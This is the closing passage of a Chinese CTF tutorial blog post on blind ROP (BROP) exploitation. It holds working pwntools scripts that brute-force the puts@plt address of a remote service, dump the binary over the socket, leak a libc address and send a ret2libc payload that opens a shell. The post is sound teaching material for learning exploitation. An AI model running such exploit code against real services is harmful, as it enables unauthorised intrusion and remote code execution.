+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_puts_addr</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">rdi_ret</span><span class="p">,</span> <span class="n">stop_gadget</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">=</span> <span class="mh">0x400000</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;password?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">length</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stop_gadget</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">content</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">content</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">ELF&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span> <span class="s1">&#39;find puts@plt addr: 0x</span><span class="si">%x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">addr</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">addr</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">brop_gadget</span><span class="o">=</span><span class="mh">0x4007ba</span>
+</span></span><span class="line"><span class="cl"><span class="n">rdi_ret</span><span class="o">=</span><span class="n">brop_gadget</span><span class="o">+</span><span class="mi">9</span>
+</span></span><span class="line"><span class="cl"><span class="n">get_puts_addr</span><span class="p">(</span><span class="mi">72</span><span class="p">,</span><span class="n">rdi_ret</span><span class="p">,</span><span class="n">stop_gadget</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="dump源程序">dump源程序</h1>
+<p>使用发现的puts地址将程序dump下来</p>
+<div class="highlight" id="id-5"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dump</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">rdi_ret</span><span class="p">,</span> <span class="n">puts_plt</span><span class="p">,</span> <span class="n">leak_addr</span><span class="p">,</span> <span class="n">stop_gadget</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">length</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stop_gadget</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;password?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="n">data</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">WelCome&#34;</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">data</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">data</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">data</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">##length = getbufferflow_length()</span>
+</span></span><span class="line"><span class="cl"><span class="n">length</span> <span class="o">=</span> <span class="mi">72</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##stop_gadget = get_stop_addr(length)</span>
+</span></span><span class="line"><span class="cl"><span class="n">stop_gadget</span> <span class="o">=</span> <span class="mh">0x4005c0</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##brop_gadget = find_brop_gadget(length,stop_gadget)</span>
+</span></span><span class="line"><span class="cl"><span class="n">brop_gadget</span> <span class="o">=</span> <span class="mh">0x4007ba</span>
+</span></span><span class="line"><span class="cl"><span class="n">rdi_ret</span> <span class="o">=</span> <span class="n">brop_gadget</span> <span class="o">+</span> <span class="mi">9</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x400555</span>
+</span></span><span class="line"><span class="cl"><span class="n">addr</span> <span class="o">=</span> <span class="mh">0x400000</span>
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">addr</span> <span class="o">&lt;</span> <span class="mh">0x401000</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">dump</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">rdi_ret</span><span class="p">,</span> <span class="n">puts_plt</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">stop_gadget</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">data</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="n">data</span>
+</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;code&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">result</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="寻找puts的got地址">寻找puts的GOT地址</h1>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1582370993137-ee86a9fc-9aab-44fa-a5ee-3bcfe5b9c5ff.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1582370993137-ee86a9fc-9aab-44fa-a5ee-3bcfe5b9c5ff.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1582370993137-ee86a9fc-9aab-44fa-a5ee-3bcfe5b9c5ff.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1582370993137-ee86a9fc-9aab-44fa-a5ee-3bcfe5b9c5ff.png?size=large 2x" sizes="auto" data-title="img" data-alt="img" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>按照之前找到的puts地址，即可找到GOT表中puts的地址</p>
+<h1 id="ret2libc">ret2libc</h1>
+<p>接下来就是ret2libc的过程</p>
+<div class="highlight" id="id-6"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">##length = getbufferflow_length()</span>
+</span></span><span class="line"><span class="cl"><span class="n">length</span> <span class="o">=</span> <span class="mi">72</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##stop_gadget = get_stop_addr(length)</span>
+</span></span><span class="line"><span class="cl"><span class="n">stop_gadget</span> <span class="o">=</span> <span class="mh">0x4006b6</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##brop_gadget = find_brop_gadget(length,stop_gadget)</span>
+</span></span><span class="line"><span class="cl"><span class="n">brop_gadget</span> <span class="o">=</span> <span class="mh">0x4007ba</span>
+</span></span><span class="line"><span class="cl"><span class="n">rdi_ret</span> <span class="o">=</span> <span class="n">brop_gadget</span> <span class="o">+</span> <span class="mi">9</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x400560</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##leakfunction(length, rdi_ret, puts_plt, stop_gadget)</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x601018</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;password?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">length</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stop_gadget</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">WelCome&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">,</span> <span class="n">puts_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">length</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stop_gadget</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2023-11-02 16:32:10">更新于 2023-11-02&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"><span><a href="/articles/2023/11/rop-brop/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span></div>
+      <div class="post-info-share">
+        <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://alextang.top/articles/2023/11/rop-brop/" data-title="ROP-BROP" data-via="a1extang" data-hashtags="Pwn,CTF,二进制"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://alextang.top/articles/2023/11/rop-brop/" data-hashtag="Pwn"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://alextang.top/articles/2023/11/rop-brop/" data-title="ROP-BROP"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/pwn/' class="post-tag">Pwn</a><a href='/tags/ctf/' class="post-tag">CTF</a><a href='/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/' class="post-tag">二进制</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/articles/2023/11/rop-ret2csu/" class="post-nav-item" rel="prev" title="ROP-ret2csu"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>ROP-ret2csu</a>
+      <a href="/articles/2023/11/advancerop-ret2dlresolve/" class="post-nav-item" rel="next" title="AdvanceROP-ret2dlresolve">AdvanceROP-ret2dlresolve<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">alextang</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div><div class="footer-line beian"><span class="icp footer-divider"><a href="https://icp.gov.moe/?keyword=20238299" target="_blank">萌ICP备20238299号</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js" async defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/copy-tex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/mhchem.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
